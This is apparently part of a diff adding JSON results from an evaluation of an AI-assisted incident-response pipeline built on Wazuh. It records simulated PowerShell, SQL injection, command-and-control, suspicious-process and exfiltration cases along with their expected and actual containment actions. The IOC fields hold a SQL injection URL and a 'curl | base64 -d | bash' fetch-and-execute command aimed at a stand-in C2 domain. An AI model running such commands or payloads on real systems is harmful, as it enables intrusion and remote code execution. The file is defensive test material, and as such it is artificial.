+        ],
+        "actualActions": [
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "victim",
+          "172.19.0.6",
+          "attack-endpoint"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "affectedHosts": [],
+        "index": "wazuh-alerts-4.x-*",
+        "evidenceSource": "WAZUH_INDEXER",
+        "searchedIocs": [
+          {
+            "type": "IPV4",
+            "value": "172.19.0.6"
+          }
+        ],
+        "skippedIocs": [],
+        "excludedIocs": [],
+        "window": {
+          "start": "2026-10-01T05:54:51.026Z",
+          "end": "2026-10-01T05:55:06.064Z"
+        }
+      },
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-05",
+      "attackType": "POWERSHELL",
+      "attackName": "PowerShell",
+      "severity": null,
+      "risk": null,
+      "incidentId": null,
+      "alertId": null,
+      "investigationId": null,
+      "recommendationId": null,
+      "playbookCode": null,
+      "decisionId": null,
+      "responseTicketId": null,
+      "verificationId": null,
+      "recommendationStatus": null,
+      "compliance": null,
+      "recommendationCompliance": "NOT_EVALUATED",
+      "investigationStartAt": null,
+      "recommendationAt": null,
+      "decisionAt": null,
+      "investigationTimeSeconds": null,
+      "timeToDecisionSeconds": null,
+      "workflow": {
+        "alertIngested": false,
+        "incidentCreated": false,
+        "aiAnalysisCompleted": false,
+        "investigationCompleted": false,
+        "recommendationCreated": false,
+        "recommendationValidated": false,
+        "policyEvaluated": false,
+        "decisionCompleted": false,
+        "responseCompleted": false,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": null,
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 0,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "ENVIRONMENT_UNAVAILABLE — not simulated and NOT reported as Real Wazuh. The mock TC-05 result (MOCK ground truth) remains the only evidence for this case.",
+      "mode": "ENVIRONMENT_UNAVAILABLE",
+      "telemetry": "ENVIRONMENT_UNAVAILABLE",
+      "simulation": null,
+      "wazuh": null,
+      "groundTruth": {
+        "caseId": "TC-05",
+        "ruleId": "n/a",
+        "attackName": "PowerShell",
+        "attackType": "POWERSHELL",
+        "mode": "ENVIRONMENT_UNAVAILABLE",
+        "simulation": "Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.",
+        "expectedWazuh": {
+          "ruleId": "n/a",
+          "level": 0,
+          "stockRule": false
+        },
+        "expectedSeverity": "high",
+        "expectedMitre": [
+          "T1059.001"
+        ],
+        "expectedIocs": [],
+        "allowedActions": [
+          "ACT-ISOLATE-ENDPOINT",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL",
+          "ACT-BLOCK-SOURCE-IP",
+          "ACT-DISABLE-ACCOUNT",
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE",
+          "ACT-BLOCK-HASH"
+        ],
+        "expectedActions": [],
+        "expectedTargets": [],
+        "expectedPlaybook": "PB-POWERSHELL",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "ENVIRONMENT_UNAVAILABLE — not simulated and NOT reported as Real Wazuh. The mock TC-05 result (MOCK ground truth) remains the only evidence for this case."
+      },
+      "interventions": [],
+      "observations": [
+        "ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment."
+      ],
+      "timeline": {},
+      "iocRecall": null,
+      "actionMatch": null,
+      "verificationDetail": null,
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "ENVIRONMENT_UNAVAILABLE"
+    },
+    {
+      "caseId": "TC-06",
+      "attackType": "SQL_INJECTION",
+      "attackName": "SQL Injection",
+      "severity": "medium",
+      "risk": null,
+      "incidentId": "4a208ad8-1c45-4bc8-887b-a2187823b3a2",
+      "alertId": "9f72df56-5347-4220-8e61-bc10e991c350",
+      "investigationId": "ae4841eb-3d3e-41b3-9241-81c5c59be020",
+      "recommendationId": "c735370c-9d5f-4a80-9c0a-641f10a170e2",
+      "playbookCode": "PB-SQL-INJECTION",
+      "decisionId": "dd299d5f-529a-49db-bedd-dcdb0f53f9ab",
+      "responseTicketId": "2940e7c9-f276-43d7-8cc0-653f7b2b1802",
+      "verificationId": "8ee9321d-81f0-428f-8a64-33bf0b7c7fbc",
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T05:55:18.519Z",
+      "recommendationAt": "2026-10-01T05:56:14.750Z",
+      "decisionAt": "2026-10-01T05:56:14.820Z",
+      "investigationTimeSeconds": 56.23,
+      "timeToDecisionSeconds": 0.07,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": true,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": true,
+        "rehuntExecuted": true
+      },
+      "workflowCompleted": true,
+      "finalStatus": "resolved",
+      "verificationMode": "REAL_WAZUH",
+      "verificationResult": "RESOLVED",
+      "rehuntRound": 1,
+      "recommendationAttemptCount": 1,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "STOCK_RULE",
+      "telemetry": "REAL_EVENTS_STOCK_RULE",
+      "simulation": {
+        "caseId": "TC-06",
+        "startedAt": "2026-10-01T05:55:06.147Z",
+        "endedAt": "2026-10-01T05:55:06.428Z",
+        "telemetry": "REAL_EVENTS_STOCK_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "requests": 12
+        },
+        "notes": []
+      },
+      "wazuh": {
+        "indexerDocId": "pKQH9qABGgCGM5y0-EHm",
+        "alertId": "1790834106.241579",
+        "timestamp": "2026-10-01T05:55:06.846+0000",
+        "ruleId": "31103",
+        "level": 7,
+        "description": "SQL injection attempt.",
+        "mitre": [
+          "T1190"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "172.19.0.6",
+        "stockRule": true,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 0.7
+      },
+      "groundTruth": {
+        "caseId": "TC-06",
+        "ruleId": "31103",
+        "attackName": "SQL Injection",
+        "attackType": "SQL_INJECTION",
+        "mode": "STOCK_RULE",
+        "simulation": "12 lowercase-token SQLi GET requests (404) from the attacker container to the endpoint's nginx access log",
+        "expectedWazuh": {
+          "ruleId": "31103",
+          "level": 7,
+          "stockRule": true
+        },
+        "expectedSeverity": "medium",
+        "expectedMitre": [
+          "T1190"
+        ],
+        "expectedIocs": [
+          {
+            "type": "ip",
+            "value": "172.19.0.6"
+          }
+        ],
+        "allowedActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "expectedActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "expectedTargets": [
+          "172.19.0.6"
+        ],
+        "expectedPlaybook": "PB-SQL-INJECTION",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": []
+      },
+      "interventions": [],
+      "observations": [],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:55:06.147Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:55:06.846+0000",
+        "alertReceivedByVigix": "2026-10-01T05:55:18.492Z",
+        "incidentOpened": "2026-10-01T05:55:18.511Z",
+        "investigationStart": "2026-10-01T05:55:18.519Z",
+        "recommendationCreated": "2026-10-01T05:56:14.750Z",
+        "irDecision": "2026-10-01T05:56:14.820Z",
+        "responseCompleted": "2026-10-01T05:56:17.865Z",
+        "verificationAt": "2026-10-01T05:56:32.921Z",
+        "detectionLatencySeconds": 0.7,
+        "ingestToRecommendationSeconds": 56.26
+      },
+      "iocRecall": {
+        "expected": 1,
+        "found": 1,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "actualActions": [
+          "ACT-BLOCK-SOURCE-IP"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "172.19.0.6"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "affectedHosts": [],
+        "index": "wazuh-alerts-4.x-*",
+        "evidenceSource": "WAZUH_INDEXER",
+        "searchedIocs": [
+          {
+            "type": "URL",
+            "value": "/app/search.php?id=1%20union%20select%20username,password%20from%20users"
+          },
+          {
+            "type": "IPV4",
+            "value": "172.19.0.6"
+          }
+        ],
+        "skippedIocs": [],
+        "excludedIocs": [],
+        "window": {
+          "start": "2026-10-01T05:56:17.865Z",
+          "end": "2026-10-01T05:56:32.887Z"
+        }
+      },
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-07",
+      "attackType": "COMMAND_AND_CONTROL",
+      "attackName": "Command & Control",
+      "severity": "high",
+      "risk": null,
+      "incidentId": "320c9ef2-c414-4293-81f3-31855aa219ce",
+      "alertId": "6a48faba-29e2-4df6-be0e-881cc7b5abf2",
+      "investigationId": "ef055d33-2707-417f-8d8a-ea61524f002b",
+      "recommendationId": "c4d618f0-a03b-4c2e-aad9-9082aa6a58aa",
+      "playbookCode": "PB-C2",
+      "decisionId": "37cef329-97f7-4422-8e7e-298385e7a922",
+      "responseTicketId": "ddf81ace-07d2-49bf-9125-3162f118098b",
+      "verificationId": "39d92130-719c-4d9c-8d23-ea3366fb2b90",
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T05:56:42.486Z",
+      "recommendationAt": "2026-10-01T05:59:31.021Z",
+      "decisionAt": "2026-10-01T05:59:31.106Z",
+      "investigationTimeSeconds": 168.54,
+      "timeToDecisionSeconds": 0.09,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": true,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": true,
+        "rehuntExecuted": true
+      },
+      "workflowCompleted": true,
+      "finalStatus": "resolved",
+      "verificationMode": "REAL_WAZUH",
+      "verificationResult": "RESOLVED",
+      "rehuntRound": 1,
+      "recommendationAttemptCount": 2,
+      "invalidOutputCount": 1,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-07",
+        "startedAt": "2026-10-01T05:56:32.993Z",
+        "endedAt": "2026-10-01T05:56:38.436Z",
+        "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7"
+        },
+        "notes": [
+          "Beacons are real HTTP requests to the isolated Docker test server; the telemetry line is generated by the harness."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "sKQJ9qABGgCGM5y0REHr",
+        "alertId": "1790834194.250015",
+        "timestamp": "2026-10-01T05:56:34.914+0000",
+        "ruleId": "100320",
+        "level": 13,
+        "description": "VIGIX-EVAL: outbound beaconing to a command-and-control server",
+        "mitre": [
+          "T1071.001"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "172.19.0.5",
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 1.92
+      },
+      "groundTruth": {
+        "caseId": "TC-07",
+        "ruleId": "100320",
+        "attackName": "Command & Control",
+        "attackType": "COMMAND_AND_CONTROL",
+        "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+        "simulation": "3 real HTTP beacons endpoint -> isolated Docker test server (vigix-eval-c2.net mapped in the endpoint's /etc/hosts); JSON connection telemetry per beacon",
+        "expectedWazuh": {
+          "ruleId": "100320",
+          "level": 13,
+          "stockRule": false
+        },
+        "expectedSeverity": "high",
+        "expectedMitre": [
+          "T1071.001"
+        ],
+        "expectedIocs": [
+          {
+            "type": "domain",
+            "value": "vigix-eval-c2.net"
+          },
+          {
+            "type": "url",
+            "value": "http://vigix-eval-c2.net:8080/gate.php"
+          },
+          {
+            "type": "ip",
+            "value": "172.19.0.7"
+          }
+        ],
+        "allowedActions": [
+          "ACT-BLOCK-DESTINATION-IP",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActions": [
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-DESTINATION-IP"
+        ],
+        "expectedTargets": [
+          "vigix-eval-c2.net",
+          "172.19.0.7"
+        ],
+        "expectedPlaybook": "PB-C2",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "PB-C2 and T1071.001 were KB gaps in the earlier MOCK run (seeded then). They are checked as present BEFORE this run; if absent it is a finding, not a silent fix."
+      },
+      "interventions": [],
+      "observations": [],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:56:32.993Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:56:34.914+0000",
+        "alertReceivedByVigix": "2026-10-01T05:56:42.466Z",
+        "incidentOpened": "2026-10-01T05:56:42.481Z",
+        "investigationStart": "2026-10-01T05:56:42.486Z",
+        "recommendationCreated": "2026-10-01T05:59:31.021Z",
+        "irDecision": "2026-10-01T05:59:31.106Z",
+        "responseCompleted": "2026-10-01T05:59:34.166Z",
+        "verificationAt": "2026-10-01T05:59:49.222Z",
+        "detectionLatencySeconds": 1.92,
+        "ingestToRecommendationSeconds": 168.56
+      },
+      "iocRecall": {
+        "expected": 3,
+        "found": 3,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-DESTINATION-IP"
+        ],
+        "actualActions": [
+          "ACT-ISOLATE-ENDPOINT",
+          "ACT-BLOCK-DESTINATION-IP",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "attack-endpoint",
+          "172.19.0.5",
+          "vigix-eval-c2.net",
+          "http://vigix-eval-c2.net:8080/gate.php"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "affectedHosts": [],
+        "index": "wazuh-alerts-4.x-*",
+        "evidenceSource": "WAZUH_INDEXER",
+        "searchedIocs": [
+          {
+            "type": "URL",
+            "value": "http://vigix-eval-c2.net:8080/gate.php"
+          },
+          {
+            "type": "DOMAIN",
+            "value": "vigix-eval-c2.net"
+          },
+          {
+            "type": "IPV4",
+            "value": "172.19.0.7"
+          }
+        ],
+        "skippedIocs": [],
+        "excludedIocs": [
+          {
+            "type": "IPV4",
+            "value": "172.19.0.5",
+            "reason": "Endpoint identity of the alerting agent (agent.name / agent.ip)"
+          }
+        ],
+        "window": {
+          "start": "2026-10-01T05:59:34.166Z",
+          "end": "2026-10-01T05:59:49.192Z"
+        }
+      },
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-08",
+      "attackType": "SUSPICIOUS_PROCESS_EXECUTION",
+      "attackName": "Suspicious Process",
+      "severity": "medium",
+      "risk": null,
+      "incidentId": "9a49fab3-7c61-4cf3-93b6-646ff76c850d",
+      "alertId": "6ab894a1-8fb4-4130-a1a4-714d199e49b7",
+      "investigationId": "e027070a-d25b-4c4f-bac3-ab766e37bb68",
+      "recommendationId": null,
+      "playbookCode": null,
+      "decisionId": null,
+      "responseTicketId": null,
+      "verificationId": null,
+      "recommendationStatus": null,
+      "compliance": null,
+      "recommendationCompliance": "NOT_EVALUATED",
+      "investigationStartAt": "2026-10-01T06:00:02.999Z",
+      "recommendationAt": null,
+      "decisionAt": null,
+      "investigationTimeSeconds": null,
+      "timeToDecisionSeconds": null,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": false,
+        "recommendationCreated": false,
+        "recommendationValidated": false,
+        "policyEvaluated": false,
+        "decisionCompleted": false,
+        "responseCompleted": false,
+        "verificationCompleted": false,
+        "rehuntExecuted": false
+      },
+      "workflowCompleted": false,
+      "finalStatus": "open",
+      "verificationMode": "NONE",
+      "verificationResult": null,
+      "rehuntRound": null,
+      "recommendationAttemptCount": 5,
+      "invalidOutputCount": 5,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-08",
+        "startedAt": "2026-10-01T05:59:49.274Z",
+        "endedAt": "2026-10-01T05:59:50.690Z",
+        "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "pid": "2153",
+          "exe": "/tmp/.cache/kworkerd",
+          "user": "www-data"
+        },
+        "notes": [
+          "Process is real (sleep renamed kworkerd, alive when inspected); the telemetry line is generated by the harness from /proc, in the auditd data.audit.* layout."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "t6QM9qABGgCGM5y0TkFA",
+        "alertId": "1790834391.254332",
+        "timestamp": "2026-10-01T05:59:51.106+0000",
+        "ruleId": "100330",
+        "level": 10,
+        "description": "VIGIX-EVAL: suspicious process executed from a world-writable path",
+        "mitre": [
+          "T1059.004"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": null,
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 1.83
+      },
+      "groundTruth": {
+        "caseId": "TC-08",
+        "ruleId": "100330",
+        "attackName": "Suspicious Process",
+        "attackType": "SUSPICIOUS_PROCESS_EXECUTION",
+        "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+        "simulation": "Real process /tmp/.cache/kworkerd (renamed sleep) as www-data plus a harmless 'curl | base64 -d | bash' pipeline against the test server; process telemetry read from /proc",
+        "expectedWazuh": {
+          "ruleId": "100330",
+          "level": 10,
+          "stockRule": false
+        },
+        "expectedSeverity": "medium",
+        "expectedMitre": [
+          "T1059.004"
+        ],
+        "expectedIocs": [
+          {
+            "type": "process",
+            "value": "/tmp/.cache/kworkerd"
+          },
+          {
+            "type": "command",
+            "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+          }
+        ],
+        "allowedActions": [
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE",
+          "ACT-BLOCK-HASH",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActions": [
+          "ACT-KILL-PROCESS",
+          "ACT-QUARANTINE-FILE"
+        ],
+        "expectedTargets": [
+          "/tmp/.cache/kworkerd",
+          "attack-endpoint"
+        ],
+        "expectedPlaybook": "PB-SUSPICIOUS-PROCESS",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "ACT-KILL-PROCESS requires COMMAND_LINE evidence; a kill recommendation without a supported target/evidence must not appear."
+      },
+      "interventions": [],
+      "observations": [
+        "EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+        "NO_VALID_RECOMMENDATION after 5 model attempts"
+      ],
+      "timeline": {
+        "simulationStart": "2026-10-01T05:59:49.274Z",
+        "wazuhAlertTimestamp": "2026-10-01T05:59:51.106+0000",
+        "alertReceivedByVigix": "2026-10-01T06:00:02.972Z",
+        "incidentOpened": "2026-10-01T06:00:02.993Z",
+        "investigationStart": "2026-10-01T06:00:02.999Z",
+        "recommendationCreated": null,
+        "irDecision": null,
+        "responseCompleted": null,
+        "verificationAt": null,
+        "detectionLatencySeconds": 1.83,
+        "ingestToRecommendationSeconds": null
+      },
+      "iocRecall": {
+        "expected": 2,
+        "found": 0,
+        "missing": [
+          "process:/tmp/.cache/kworkerd",
+          "command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash"
+        ]
+      },
+      "actionMatch": null,
+      "verificationDetail": null,
+      "rehuntError": null,
+      "timingMode": "UNINTERRUPTED_SCRIPTED",
+      "environmentStatus": "AVAILABLE",
+      "irReject": null
+    },
+    {
+      "caseId": "TC-09",
+      "attackType": "DATA_EXFILTRATION",
+      "attackName": "Data Exfiltration",
+      "severity": "high",
+      "risk": null,
+      "incidentId": "ec553647-73a2-494d-a9c7-6245267aaace",
+      "alertId": "04acfab3-f35c-4f77-8edc-e3b4385e1886",
+      "investigationId": "171b7c10-96d3-4001-8c4a-a2d63f89a9a3",
+      "recommendationId": "9482b915-9222-43b0-b9b4-eb25cbf74985",
+      "playbookCode": "PB-DATA-EXFIL",
+      "decisionId": "f26e5a0d-17b1-469f-ad99-a06fd2a3ecbc",
+      "responseTicketId": "cef764a1-1f26-44cd-92d2-efe6209b34b5",
+      "verificationId": "c5d21d57-f602-4cc4-ae1f-56a3affbebd4",
+      "recommendationStatus": "VALIDATED",
+      "compliance": {
+        "attackAlignment": true,
+        "evidenceSupport": true,
+        "knowledgeValidity": true,
+        "policyCompliance": true,
+        "playbookAlignment": true,
+        "approvalCorrectness": true,
+        "compliant": true,
+        "failedChecks": []
+      },
+      "recommendationCompliance": "COMPLIANT",
+      "investigationStartAt": "2026-10-01T06:04:16.805Z",
+      "recommendationAt": "2026-10-01T06:05:27.107Z",
+      "decisionAt": "2026-10-01T06:05:27.171Z",
+      "investigationTimeSeconds": 70.3,
+      "timeToDecisionSeconds": 0.06,
+      "workflow": {
+        "alertIngested": true,
+        "incidentCreated": true,
+        "aiAnalysisCompleted": true,
+        "investigationCompleted": true,
+        "recommendationCreated": true,
+        "recommendationValidated": true,
+        "policyEvaluated": true,
+        "decisionCompleted": true,
+        "responseCompleted": true,
+        "verificationCompleted": true,
+        "rehuntExecuted": true
+      },
+      "workflowCompleted": true,
+      "finalStatus": "resolved",
+      "verificationMode": "REAL_WAZUH",
+      "verificationResult": "RESOLVED",
+      "rehuntRound": 1,
+      "recommendationAttemptCount": 1,
+      "invalidOutputCount": 0,
+      "interventionRequired": false,
+      "interventionType": [],
+      "findings": [],
+      "notes": "",
+      "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+      "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+      "simulation": {
+        "caseId": "TC-09",
+        "startedAt": "2026-10-01T06:03:58.556Z",
+        "endedAt": "2026-10-01T06:04:00.464Z",
+        "telemetry": "CONTROLLED_TELEMETRY_CUSTOM_RULE",
+        "facts": {
+          "attackerIp": "172.19.0.6",
+          "endpointIp": "172.19.0.5",
+          "testServerIp": "172.19.0.7",
+          "bytesOut": 3145728,
+          "durationSeconds": 1
+        },
+        "notes": [
+          "Synthetic 3 MB of 'A' bytes, discarded by the sink. No real or personal data."
+        ]
+      },
+      "wazuh": {
+        "indexerDocId": "vqQQ9qABGgCGM5y0MkFY",
+        "alertId": "1790834641.255390",
+        "timestamp": "2026-10-01T06:04:01.318+0000",
+        "ruleId": "100340",
+        "level": 13,
+        "description": "VIGIX-EVAL: large outbound transfer to an external host (possible data exfiltration)",
+        "mitre": [
+          "T1048"
+        ],
+        "agent": "attack-endpoint",
+        "srcip": "172.19.0.5",
+        "stockRule": false,
+        "ruleMatch": true,
+        "levelMatch": true,
+        "mitreMatch": true,
+        "detectionLatencySeconds": 2.76
+      },
+      "groundTruth": {
+        "caseId": "TC-09",
+        "ruleId": "100340",
+        "attackName": "Data Exfiltration",
+        "attackType": "DATA_EXFILTRATION",
+        "mode": "CUSTOM_RULE_CONTROLLED_TELEMETRY",
+        "simulation": "Synthetic 3 MB test-data.txt POSTed (real HTTP) to the isolated Docker test server (vigix-eval-exfil.net); body discarded by the sink; JSON transfer telemetry",
+        "expectedWazuh": {
+          "ruleId": "100340",
+          "level": 13,
+          "stockRule": false
+        },
+        "expectedSeverity": "high",
+        "expectedMitre": [
+          "T1048"
+        ],
+        "expectedIocs": [
+          {
+            "type": "domain",
+            "value": "vigix-eval-exfil.net"
+          },
+          {
+            "type": "url",
+            "value": "http://vigix-eval-exfil.net:8080/upload"
+          },
+          {
+            "type": "ip",
+            "value": "172.19.0.7"
+          }
+        ],
+        "allowedActions": [
+          "ACT-BLOCK-DESTINATION-IP",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActions": [
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-DESTINATION-IP"
+        ],
+        "expectedTargets": [
+          "vigix-eval-exfil.net",
+          "172.19.0.7"
+        ],
+        "expectedPlaybook": "PB-DATA-EXFIL",
+        "approvalExpected": true,
+        "expectedPolicy": "POL-A01 approval",
+        "expectedApproval": "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves",
+        "expectedVerification": "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained",
+        "knownFindings": [],
+        "environmentNote": "PB-DATA-EXFIL and T1048 were KB gaps in the earlier MOCK run; checked as present before this run."
+      },
+      "interventions": [],
+      "observations": [],
+      "timeline": {
+        "simulationStart": "2026-10-01T06:03:58.556Z",
+        "wazuhAlertTimestamp": "2026-10-01T06:04:01.318+0000",
+        "alertReceivedByVigix": "2026-10-01T06:04:16.780Z",
+        "incidentOpened": "2026-10-01T06:04:16.797Z",
+        "investigationStart": "2026-10-01T06:04:16.805Z",
+        "recommendationCreated": "2026-10-01T06:05:27.107Z",
+        "irDecision": "2026-10-01T06:05:27.171Z",
+        "responseCompleted": "2026-10-01T06:05:30.212Z",
+        "verificationAt": "2026-10-01T06:05:45.309Z",
+        "detectionLatencySeconds": 2.76,
+        "ingestToRecommendationSeconds": 70.33
+      },
+      "iocRecall": {
+        "expected": 3,
+        "found": 3,
+        "missing": []
+      },
+      "actionMatch": {
+        "expectedActions": [
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-DESTINATION-IP"
+        ],
+        "actualActions": [
+          "ACT-BLOCK-DESTINATION-IP",
+          "ACT-BLOCK-DOMAIN",
+          "ACT-BLOCK-URL",
+          "ACT-ISOLATE-ENDPOINT"
+        ],
+        "expectedActionHit": true,
+        "actualTargets": [
+          "172.19.0.5",
+          "vigix-eval-exfil.net",
+          "http://vigix-eval-exfil.net:8080/upload",
+          "attack-endpoint"
+        ],
+        "expectedTargetHit": true
+      },
+      "verificationDetail": {
+        "result": "RESOLVED",
+        "matchingEvents": 0,
+        "spreadDetected": false,
+        "iocRecurrence": false,
+        "threatContained": true,
+        "affectedHosts": [],
+        "index": "wazuh-alerts-4.x-*",
+        "evidenceSource": "WAZUH_INDEXER",
+        "searchedIocs": [
+          {
+            "type": "URL",
+            "value": "http://vigix-eval-exfil.net:8080/upload"
+          },
+          {
+            "type": "DOMAIN",
+            "value": "vigix-eval-exfil.net"
+          },
+          {
